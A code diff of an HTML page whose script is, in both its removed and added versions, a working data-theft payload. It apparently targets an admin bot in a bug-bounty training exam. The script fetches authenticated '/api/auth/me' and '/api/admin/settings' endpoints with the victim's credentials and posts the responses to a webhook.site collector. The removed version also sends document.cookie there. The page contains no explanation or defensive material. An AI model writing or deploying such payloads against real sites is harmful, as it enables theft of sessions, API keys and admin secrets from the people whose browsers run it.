@@ -1,25 +1,40 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <script>
-        const webhook = "https://webhook.site/0279174a-c77a-4643-aa9c-0251998890b0";
-        const target = "https://api-bugbounty-exam.hashacademy.co/api/auth/me";
+        <script>
+    const logger = "https://webhook.site/0279174a-c77a-4643-aa9c-0251998890b0";
 
-        // We use fetch but immediately follow up with a location change
-        fetch(target, {credentials: "include"})
-            .then(r => r.text())
-            .then(data => {
-                // This forces the bot to go to your webhook with the data in the URL
-                window.location.href = webhook + "?stolen_data=" + btoa(data);
-            })
-            .catch(err => {
-                window.location.href = webhook + "?error=" + btoa(err);
+    async function findSecret() {
+        // Try the 'Me' endpoint - often contains API keys or secrets
+        try {
+            const res = await fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/me", {
+                method: "GET",
+                credentials: "include"
             });
+            const data = await res.json();
             
-        // Fallback: If fetch fails, just try to grab the cookie directly
-        setTimeout(() => {
-            window.location.href = webhook + "?cookie=" + btoa(document.cookie);
-        }, 2000);
-    </script>
+            // Leak it to your webhook
+            fetch(logger, {
+                method: "POST",
+                body: JSON.stringify({ source: "AUTH_ME", data: data })
+            });
+        } catch (e) {}
+
+        // Try a 'Settings' endpoint just in case
+        try {
+            const res2 = await fetch("https://api-bugbounty-exam.hashacademy.co/api/admin/settings", {
+                method: "GET",
+                credentials: "include"
+            });
+            const data2 = await res2.json();
+            fetch(logger, {
+                method: "POST",
+                body: JSON.stringify({ source: "ADMIN_SETTINGS", data: data2 })
+            });
+        } catch (e) {}
+    }
+
+    findSecret();
+</script>
 </body>
 </html>
